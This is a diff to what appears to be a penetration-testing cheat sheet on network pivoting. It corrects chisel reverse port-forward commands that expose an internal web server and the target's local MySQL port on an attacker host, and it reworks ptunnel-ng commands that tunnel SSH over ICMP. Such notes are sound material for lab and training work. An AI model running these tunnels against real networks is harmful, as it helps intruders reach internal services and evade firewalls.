@@ -138,17 +138,17 @@ SOCKS5 proxy is now on `attacker:1080`. Use with proxychains as above.
 
 ### Forward a single port
 
-```bash
-# On target: forward attacker:8888 to internal 172.16.0.10:80
-./chisel client 10.10.14.5:8080 8888:172.16.0.10:80
-```
+{{< terminal title="target" >}}
+# Forward attacker:8888 to internal 172.16.0.10:80
+./chisel client 10.10.14.5:8080 R:8888:172.16.0.10:80
+{{< /terminal >}}
 
 ### Reverse port forward
 
-```bash
-# On target: expose target's local 3306 on attacker:9001
+{{< terminal title="target" >}}
+# Expose target's local 3306 on attacker:9001
 ./chisel client 10.10.14.5:8080 R:9001:127.0.0.1:3306
-```
+{{< /terminal >}}
 
 ### Tips
 
@@ -407,18 +407,20 @@ icmpsh.exe -t 10.10.14.5
 
 TCP-over-ICMP. Full tunnel, not just a shell.
 
-{{< terminal title="attacker" >}}
-ptunnel-ng -r 10.10.14.5 -R 22
+{{< terminal title="target (runs the proxy)" >}}
+# Restrict the ICMP tunnel to forward to the target's own SSH
+ptunnel-ng -r 127.0.0.1 -R 22
 {{< /terminal >}}
 
-{{< terminal title="target" >}}
-ptunnel-ng -p 10.10.14.5 -l 2222 -r 10.10.14.5 -R 22
+{{< terminal title="attacker (runs the client)" >}}
+# Reach the target over ICMP, expose its SSH locally on 2222
+ptunnel-ng -p 172.16.0.10 -l 2222 -r 127.0.0.1 -R 22
 {{< /terminal >}}
 
 Then SSH through the ICMP tunnel:
 
 ```bash
-ssh -p 2222 user@127.0.0.1
+ssh -p 2222 user@127.0.0.1   # tunneled to the target's SSH over ICMP
 ```
 
 ---
